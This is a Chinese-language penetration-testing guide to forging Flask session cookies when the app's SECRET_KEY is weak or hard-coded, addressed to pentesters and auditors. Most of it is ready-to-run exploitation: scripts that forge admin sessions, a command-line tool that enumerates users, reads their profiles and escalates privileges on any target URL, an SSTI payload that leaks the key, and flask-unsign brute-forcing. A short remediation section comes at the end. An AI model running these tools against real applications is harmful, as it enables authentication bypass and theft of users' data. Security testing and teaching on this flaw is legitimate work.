# Flask 弱密钥会话伪造攻击

## 1. 概述

### 1.1 漏洞原理

Flask 使用客户端会话（Client-Side Session）机制，将会话数据序列化后通过 HMAC 签名存储在 Cookie 中。当应用使用弱密钥或硬编码密钥作为 `SECRET_KEY` 时，攻击者可以：
1. 从源码中获取密钥
2. 使用密钥伪造任意会话 Cookie
3. 以任意用户身份认证，实现认证绕过

**核心漏洞模式：**
```python
# 危险模式 - 硬编码弱密钥
app = Flask(__name__)
app.secret_key = 'your_secret_key'  # 弱密钥，暴露在源码中
```

### 1.2 适用范围

- Flask 应用使用硬编码 SECRET_KEY
- Flask 应用使用默认/示例密钥
- Flask 应用 SECRET_KEY 熵值过低（<64 位）
- 使用 itsdangerous 库进行签名的应用

### 1.3 读者对象

- 渗透测试工程师
- 安全审计人员
- Web 应用安全研究人员

---

## 2. 漏洞探测方法

### 2.1 密钥发现

**源码审计关键词：**
```python
# 搜索以下模式
app.secret_key = '...'
SECRET_KEY = '...'
config['SECRET_KEY'] = '...'
os.environ.get('SECRET_KEY', '...')  # 默认值
```

**常见弱密钥：**
```
your_secret_key
secret
secret_key
flask_secret_key
changeme
dev
test
admin
```

### 2.2 会话 Cookie 分析

**Cookie 格式：**
```
session=<base64_payload>.<base64_timestamp>.<base64_signature>
```

**示例 Cookie：**
```
session=eyJ1c2VyX2lkIjoxfQ.aQTDVw.ermDdaGn2gy3NJAwqmdpVkkbfng
         └─ Payload ─┘ └─时间戳─┘ └───── HMAC 签名 ─────┘
```

**解码 Payload：**
```python
import base64
import json

cookie = "eyJ1c2VyX2lkIjoxfQ.aQTDVw.ermDdaGn2gy3NJAwqmdpVkkbfng"
payload = cookie.split('.')[0]

# 添加填充后解码
padding = 4 - (len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload + '=' * padding)
print(json.loads(decoded))
# 输出：{"user_id": 1}
```

### 2.3 密钥验证

**测试密钥是否正确：**
```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # 待测试密钥

# 尝试签名
serializer = URLSafeTimedSerializer(app.secret_key)
token = serializer.dumps({'user_id': 1})
print(f"Generated token: {token}")

# 如果生成成功，说明密钥格式正确
```

---

## 3. 漏洞利用方法

### 3.1 会话伪造攻击

**方法一：使用 Flask 内部 API**
```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# 获取签名器
serializer = app.session_interface.get_signing_serializer(app)

# 伪造任意用户会话
forged_token = serializer.dumps({'user_id': 1})
print(f"Forged session: {forged_token}")

# 使用伪造的 Cookie 访问
# curl -H "Cookie: session={forged_token}" http://target/home
```

**方法二：直接使用 itsdangerous**
```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key)

# 伪造管理员会话
admin_session = serializer.dumps({
    'user_id': 1,
    'is_admin': True,
    'username': 'admin'
})
print(f"Admin session: {admin_session}")
```

### 3.2 水平权限提升

**访问其他用户数据：**
```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'
serializer = app.session_interface.get_signing_serializer(app)

# 遍历用户 ID
for user_id in range(1, 100):
    token = serializer.dumps({'user_id': user_id})
    print(f"User {user_id}: session={token}")
    
    # 使用生成的 Cookie 访问其他用户数据
    # curl -H "Cookie: session={token}" http://target/profile
```

### 3.3 垂直权限提升

**添加管理员权限：**
```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'
serializer = app.session_interface.get_signing_serializer(app)

# 伪造管理员会话
admin_session = serializer.dumps({
    'user_id': 1,
    'is_admin': True,
    'role': 'admin',
    'permissions': ['read', 'write', 'delete']
})

print(f"Admin session cookie: {admin_session}")
```

### 3.4 自动化利用脚本

```python
#!/usr/bin/env python3
"""
Flask 会话伪造自动化利用工具
"""

import requests
from flask import Flask
from itsdangerous import URLSafeTimedSerializer
import argparse

class FlaskSessionForge:
    def __init__(self, secret_key, target_url):
        self.secret_key = secret_key
        self.target = target_url
        self.session = requests.Session()
        
        # 初始化 Flask 应用
        self.app = Flask(__name__)
        self.app.secret_key = secret_key
        self.serializer = self.app.session_interface.get_signing_serializer(self.app)
    
    def forge_session(self, user_id=1, **kwargs):
        """伪造会话 Cookie"""
        data = {'user_id': user_id}
        data.update(kwargs)
        return self.serializer.dumps(data)
    
    def test_session(self, session_cookie):
        """测试会话是否有效"""
        response = self.session.get(
            f"{self.target}/home",
            cookies={'session': session_cookie}
        )
        return response.status_code == 200
    
    def enumerate_users(self, max_id=100):
        """枚举用户"""
        print(f"[*] Enumerating users (1-{max_id})...")
        valid_users = []
        
        for user_id in range(1, max_id + 1):
            session = self.forge_session(user_id=user_id)
            if self.test_session(session):
                valid_users.append(user_id)
                print(f"[✓] User {user_id} exists")
        
        return valid_users
    
    def access_user_data(self, user_id):
        """访问指定用户数据"""
        session = self.forge_session(user_id=user_id)
        response = self.session.get(
            f"{self.target}/profile",
            cookies={'session': session}
        )
        return response.text
    
    def escalate_privileges(self, user_id=1):
        """权限提升"""
        session = self.forge_session(
            user_id=user_id,
            is_admin=True,
            role='admin'
        )
        response = self.session.get(
            f"{self.target}/admin",
            cookies={'session': session}
        )
        return response.status_code == 200

def main():
    parser = argparse.ArgumentParser(description='Flask Session Forge Tool')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('secret', help='Flask SECRET_KEY')
    parser.add_argument('--user-id', type=int, default=1, help='Target user ID')
    parser.add_argument('--enumerate', action='store_true', help='Enumerate users')
    parser.add_argument('--admin', action='store_true', help='Escalate to admin')
    
    args = parser.parse_args()
    
    exploit = FlaskSessionForge(args.secret, args.target)
    
    if args.enumerate:
        users = exploit.enumerate_users()
        print(f"\n[✓] Found {len(users)} valid users")
    
    elif args.admin:
        if exploit.escalate_privileges(args.user_id):
            print(f"[✓] Successfully escalated to admin (user {args.user_id})")
        else:
            print("[✗] Privilege escalation failed")
    
    else:
        session = exploit.forge_session(user_id=args.user_id)
        print(f"[*] Forged session for user {args.user_id}:")
        print(f"    Cookie: session={session}")
        
        data = exploit.access_user_data(args.user_id)
        print(f"\n[✓] Successfully accessed user {args.user_id} data")

if __name__ == "__main__":
    main()
```

---

## 4. 高级利用技术

### 4.1 会话固定攻击

```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'
serializer = app.session_interface.get_signing_serializer(app)

# 预先生成会话
victim_session = serializer.dumps({'user_id': 1})

# 攻击场景：
# 1. 诱导受害者使用预先生成的会话
# 2. 受害者登录后，攻击者使用相同会话访问
# 3. 由于密钥已知，会话持续有效

print(f"Pre-generated session: {victim_session}")
```

### 4.2 多应用会话重用

**场景：** 多个 Flask 应用使用相同 SECRET_KEY

```python
# 应用 A 的密钥
SECRET_KEY_A = 'shared_secret'

# 应用 B 使用相同密钥
SECRET_KEY_B = 'shared_secret'

# 在应用 A 生成的会话可在应用 B 使用
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app_a = Flask(__name__)
app_a.secret_key = SECRET_KEY_A
session_a = app_a.session_interface.get_signing_serializer(app_a).dumps({'user_id': 1})

# 该会话在应用 B 同样有效
```

### 4.3 组合攻击

**SSTI + 会话伪造：**
```bash
# 1. 通过 SSTI 读取 SECRET_KEY
curl -s 'http://target/ssti?term=lipsum.__globals__.update(key=config.SECRET_KEY)+or+1'

# 2. 使用获取的密钥伪造会话
python3 forge_session.py --secret <leaked_key> --target http://target

# 3. 使用伪造会话访问受保护资源
```

---

## 5. 常见 Payload 速查表

| 目标 | Payload/命令 | 说明 |
|------|-------------|------|
| 生成普通用户会话 | `serializer.dumps({'user_id': 1})` | 伪造用户 ID=1 的会话 |
| 生成管理员会话 | `serializer.dumps({'user_id': 1, 'is_admin': True})` | 添加管理员权限 |
| 生成多应用会话 | `serializer.dumps({'user_id': 1, 'app': 'admin'})` | 跨应用会话 |
| 解码 Cookie | `base64.urlsafe_b64decode(payload)` | 解析 Cookie Payload |
| 验证密钥 | `serializer.dumps({'test': 1})` | 测试密钥是否有效 |
| 枚举用户 | `for i in range(1,100): dumps({'user_id': i})` | 遍历用户 ID |

---

## 6. 自动化利用工具

### 6.1 Flask-Unsign 工具

```bash
# 安装
pip install flask-unsign

# 发现密钥
flask-unsign --unsign --cookie "eyJ1c2VyX2lkIjoxfQ.aQTDVw.ermDdaGn2gy3NJAwqmdpVkkbfng"

# 使用已知密钥伪造
flask-unsign --sign --cookie "{'user_id': 1}" --secret "your_secret_key"

# 暴力破解密钥
flask-unsign --wordlist rockyou.txt --cookie "eyJ1c2VyX2lkIjoxfQ.aQTDVw.ermDdaGn2gy3NJAwqmdpVkkbfng"
```

### 6.2 自定义利用脚本

```python
#!/usr/bin/env python3
"""
Flask 会话伪造快速利用脚本
"""

from flask import Flask
from itsdangerous import URLSafeTimedSerializer
import sys

def forge_session(secret_key, user_id=1, **kwargs):
    app = Flask(__name__)
    app.secret_key = secret_key
    serializer = app.session_interface.get_signing_serializer(app)
    
    data = {'user_id': user_id}
    data.update(kwargs)
    
    return serializer.dumps(data)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <secret_key> <user_id> [admin]")
        sys.exit(1)
    
    secret = sys.argv[1]
    user_id = int(sys.argv[2])
    is_admin = len(sys.argv) > 3 and sys.argv[3] == 'admin'
    
    if is_admin:
        session = forge_session(secret, user_id=user_id, is_admin=True, role='admin')
        print(f"[✓] Admin session forged for user {user_id}:")
    else:
        session = forge_session(secret, user_id=user_id)
        print(f"[✓] Session forged for user {user_id}:")
    
    print(f"    Cookie: session={session}")
    print(f"\nUsage: curl -H 'Cookie: session={session}' http://target/protected")
```

---

## 7. 修复建议

### 7.1 使用强密钥

```python
# 错误示例
app.secret_key = 'your_secret_key'

# 正确示例 - 使用 secrets 模块生成强密钥
import secrets
app.secret_key = secrets.token_hex(32)  # 256 位密钥

# 或使用环境变量
app.secret_key = os.environ.get('SECRET_KEY')
```

### 7.2 密钥管理

```python
# 使用密钥管理系统
from cryptography.fernet import Fernet

# 从安全存储加载密钥
def load_secret_key():
    # 从 AWS Secrets Manager / HashiCorp Vault 加载
    pass

app.secret_key = load_secret_key()
```

### 7.3 服务器端会话

```python
# 使用服务器端会话（Redis/Database）
from flask_session import Session

app.config['SESSION_TYPE'] = 'redis'
app.config['SESSION_REDIS'] = 'redis://localhost:6379'
Session(app)
```

---

## 8. 参考资源

- [Flask Session Security](https://flask.palletsprojects.com/en/latest/security/)
- [itsdangerous Documentation](https://itsdangerous.palletsprojects.com/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Flask-Unsign Tool](https://github.com/Paradoxis/Flask-Unsign)
